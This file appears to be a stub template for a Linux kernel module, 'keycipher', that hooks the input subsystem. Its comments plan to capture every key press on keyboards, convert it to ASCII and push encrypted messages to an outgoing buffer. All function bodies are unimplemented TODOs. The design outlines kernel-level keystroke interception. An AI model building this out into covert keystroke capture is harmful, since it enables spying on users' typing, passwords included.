#include <linux/input.h>
#include <linux/kernel.h>
#include "hid_intercept.h"
#include "fifo_buffer.h"
#include "keycipher.h"

/*
 * hid_event_handler - callback fired for every keyboard event
 * - filter for EV_KEY events only (ignore EV_SYN, EV_MSC etc.)
 * - filter for key press only (value == 1), ignore release (0) and repeat (2)
 * - convert keycode to ASCII character
 * - build a keycipher_message with the character as data
 * - call fifo_write(&outgoing_fifo, &msg) to push encrypted message
 *   NOTE: fifo_write will handle encryption before storing
 */
static void hid_event_handler(struct input_handle *handle, unsigned int type,
                               unsigned int code, int value)
{
    /* TODO: implement keystroke capture and push to outgoing FIFO */
}

/*
 * hid_connect - called when a matching input device is found
 * - call input_open_device(handle)
 * - log which device was connected (dmesg)
 * returns 0 on success
 */
static int hid_connect(struct input_handler *handler, struct input_dev *dev,
                        const struct input_device_id *id)
{
    /* TODO: implement device connection */
    return 0;
}

/*
 * hid_disconnect - called when input device is removed
 * - call input_close_device(handle)
 * - call input_unregister_handle(handle)
 * - log disconnection
 */
static void hid_disconnect(struct input_handle *handle)
{
    /* TODO: implement device disconnection */
}

/* match USB HID keyboard devices only */
static const struct input_device_id hid_ids[] = {
    {
        .flags = INPUT_DEVICE_ID_MATCH_EVBIT,
        .evbit = { BIT_MASK(EV_KEY) },
    },
    { },
};

static struct input_handler keycipher_handler = {
    .event      = hid_event_handler,
    .connect    = hid_connect,
    .disconnect = hid_disconnect,
    .name       = "keycipher",
    .id_table   = hid_ids,
};

int hid_intercept_init(void)
{
    /*
     * register keycipher_handler with the kernel input subsystem
     * - call input_register_handler(&keycipher_handler)
     * - log success or failure to dmesg
     */
    /* TODO: implement registration */
    return 0;
}

void hid_intercept_exit(void)
{
    /*
     * cleanly unregister the handler
     * - call input_unregister_handler(&keycipher_handler)
     */
    /* TODO: implement unregistration */
}
